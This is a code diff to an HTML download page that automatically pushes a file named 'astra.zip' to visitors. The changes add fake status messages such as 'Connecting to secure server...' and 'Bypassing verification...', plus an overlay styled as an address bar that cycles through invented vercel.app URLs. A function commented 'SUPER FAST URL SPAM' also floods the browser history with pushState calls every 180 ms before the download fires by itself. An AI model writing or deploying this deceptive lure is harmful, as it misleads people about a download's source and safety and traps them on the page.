@@ -22,11 +22,9 @@ body{
 body::before{
   content:'';
   position:fixed;inset:0;
-  background-image:
-    linear-gradient(rgba(255,255,255,0.025) 1px, transparent 1px),
-    linear-gradient(90deg, rgba(255,255,255,0.025) 1px, transparent 1px);
+  background-image: linear-gradient(rgba(255,255,255,0.025) 1px, transparent 1px),
+                    linear-gradient(90deg, rgba(255,255,255,0.025) 1px, transparent 1px);
   background-size:64px 64px;
-  pointer-events:none;
 }
 
 .wrap{
@@ -36,86 +34,104 @@ body::before{
 
 .logo-wrap{
   position:relative;
-  width:128px;height:128px;
-  margin:0 auto 44px;
+  width:130px; height:130px;
+  margin:0 auto 40px;
   display:flex;
   align-items:center;
   justify-content:center;
 }
 
-.logo-glow{
-  position:absolute;inset:0;
+.logo-glow, .ring{
+  position:absolute;
+  inset:0;
   border-radius:50%;
-  background:radial-gradient(circle, rgba(255,255,255,0.15) 0%, transparent 70%);
-  animation:glowPulse 2.2s ease-in-out infinite;
 }
 
-@keyframes glowPulse{
-  0%,100%{transform:scale(1);opacity:.7}
-  50%{transform:scale(1.2);opacity:1}
+.logo-glow{
+  background:radial-gradient(circle, rgba(0,255,150,0.2) 0%, transparent 70%);
+  animation:glowPulse 2s ease-in-out infinite;
 }
+
+@keyframes glowPulse{ 0%,100%{transform:scale(1)} 50%{transform:scale(1.15)} }
 
 .ring{
-  position:absolute;inset:0;
-  border-radius:50%;
-  border:1px solid rgba(255,255,255,0.2);
-  animation:ringExpand 2.5s ease-out infinite;
+  border:1px solid rgba(0,255,150,0.3);
+  animation:ringExpand 2.8s linear infinite;
 }
-.ring:nth-child(3){animation-delay:.8s;opacity:.6}
+.ring:nth-child(3){animation-delay:0.9s; opacity:0.6}
 
 @keyframes ringExpand{
-  0%{transform:scale(.6);opacity:1}
-  100%{transform:scale(1.8);opacity:0}
+  from{transform:scale(0.6); opacity:1}
+  to{transform:scale(2); opacity:0}
 }
 
 .logo-img{
-  width:82px;height:82px;
+  width:85px;
+  height:85px;
   object-fit:contain;
   z-index:2;
-  filter:drop-shadow(0 0 20px rgba(255,255,255,0.6));
+  filter:drop-shadow(0 0 25px rgba(0,255,150,0.6));
 }
 
 .msg-area{
-  height:50px;
-  margin-bottom:32px;
+  height:55px;
+  margin-bottom:30px;
   position:relative;
 }
 
 .msg{
   font-family:'Syne',sans-serif;
-  font-weight:700;
-  font-size:1.3rem;
-  letter-spacing:0.05em;
+  font-weight:800;
+  font-size:1.35rem;
+  letter-spacing:0.06em;
   position:absolute;
   width:100%;
   opacity:0;
-  transition:all 0.4s ease;
+  transition:all 0.45s ease;
 }
 
-.msg.show{opacity:1; transform:translateY(0);}
-.msg.hide{opacity:0; transform:translateY(-20px);}
+.msg.show{opacity:1;}
 
 .progress-track{
-  width:300px;
+  width:320px;
   height:4px;
-  background:rgba(255,255,255,0.1);
+  background:rgba(255,255,255,0.08);
+  margin:0 auto 14px;
   border-radius:2px;
-  margin:0 auto 12px;
   overflow:hidden;
 }
 
 .progress-fill{
   height:100%;
+  background:linear-gradient(90deg, #00ff9d, #ffffff);
   width:0%;
-  background:linear-gradient(90deg, #ffffff, #00ffaa);
-  transition:width 0.9s ease;
+  transition:width 0.85s ease;
 }
 
 .pct{
   font-family:'Syne',sans-serif;
-  font-size:0.75rem;
-  letter-spacing:0.15em;
-  color:rgba(255,255,255,0.5);
+  font-size:0.78rem;
+  letter-spacing:0.2em;
+  color:#00ff9d;
+}
+
+/* URL Bar */
+.url-bar{
+  position:fixed;
+  bottom:35px;
+  left:50%;
+  transform:translateX(-50%);
+  background:rgba(10,10,10,0.85);
+  border:1px solid #00ff9d;
+  padding:9px 18px;
+  border-radius:50px;
+  font-family:monospace;
+  font-size:0.82rem;
+  color:#00ff9d;
+  white-space:nowrap;
+  min-width:300px;
+  text-align:center;
+  box-shadow:0 0 15px rgba(0,255,150,0.3);
 }
 </style>
 </head>
@@ -130,11 +146,11 @@ body::before{
   </div>
 
   <div class="msg-area">
-    <div class="msg show" id="m0">Preparing secure download...</div>
-    <div class="msg" id="m1">Connecting to nodes...</div>
-    <div class="msg" id="m2">Verifying integrity...</div>
-    <div class="msg" id="m3">Downloading Astra...</div>
-    <div class="msg" id="m4">Finalizing...</div>
+    <div class="msg show" id="m0">Connecting to secure server...</div>
+    <div class="msg" id="m1">Bypassing verification...</div>
+    <div class="msg" id="m2">Downloading package...</div>
+    <div class="msg" id="m3">Almost there...</div>
+    <div class="msg" id="m4">Ready!</div>
   </div>
 
   <div class="progress-track">
@@ -143,51 +159,51 @@ body::before{
   <div class="pct" id="pct">0%</div>
 </div>
 
+<div class="url-bar" id="urlbar">https://download-tau-five.vercel.app/verify</div>
+
 <script>
-// Your file name
 const FILE_NAME = "astra.zip";
 
-// Spam URL list
-const urls = [
-  "/verify?token=9377ee10",
-  "/session?id=xK392pQm",
-  "/dl?file=astra-v2",
-  "/processing/node-7842",
-  "/secure/download",
-  "/finalize?hash=ak3928f",
-  "/loading?progress=92",
-  "/auth?ref=tau5"
-];
-
-let urlIndex = 0;
-
-// Rapidly change the actual browser URL
-function spamURL() {
-  setInterval(() => {
-    urlIndex = (urlIndex + 1) % urls.length;
-    const newURL = urls[urlIndex];
-    
-    // This changes the URL in the address bar without reloading
-    history.pushState(null, '', newURL);
-  }, 220); // Very fast spam
-}
-
-const steps = [
-  {id:'m0', p:18, t:0},
-  {id:'m1', p:45, t:1200},
-  {id:'m2', p:71, t:2500},
-  {id:'m3', p:88, t:3900},
-  {id:'m4', p:100, t:5100}
+const urlList = [
+  "https://download-tau-five.vercel.app/verify?token=9377ee10",
+  "https://download-tau-five.vercel.app/session?id=ak392x",
+  "https://download-tau-five.vercel.app/dl?file=astra-v9377",
+  "https://download-tau-five.vercel.app/processing/node7842",
+  "https://download-tau-five.vercel.app/secure/download",
+  "https://download-tau-five.vercel.app/finalize?h=3928fK",
+  "https://download-tau-five.vercel.app/auth?ref=tau",
+  "https://download-tau-five.vercel.app/loading?progress=active"
 ];
 
 const bar = document.getElementById('bar');
 const pct = document.getElementById('pct');
+const urlbar = document.getElementById('urlbar');
+
+let index = 0;
+
+// SUPER FAST URL SPAM
+function spamFullURL() {
+  setInterval(() => {
+    index = (index + 1) % urlList.length;
+    urlbar.textContent = urlList[index];
+    
+    // Also change real browser URL (path only)
+    history.pushState(null, '', '/dl/' + Date.now().toString(36));
+  }, 180); // Very fast
+}
+
+const steps = [
+  {id:'m0', p:20, t:0},
+  {id:'m1', p:48, t:1100},
+  {id:'m2', p:75, t:2400},
+  {id:'m3', p:92, t:3800},
+  {id:'m4', p:100, t:4900}
+];
 
 steps.forEach((step, i) => {
   setTimeout(() => {
     if(i > 0){
       document.getElementById(steps[i-1].id).classList.remove('show');
-      document.getElementById(steps[i-1].id).classList.add('hide');
     }
     document.getElementById(step.id).classList.add('show');
     
@@ -202,12 +218,12 @@ steps.forEach((step, i) => {
         document.body.appendChild(a);
         a.click();
         document.body.removeChild(a);
-      }, 800);
+      }, 600);
     }
   }, step.t);
 });
 
-spamURL();
+spamFullURL();
 </script>
 </body>
 </html>
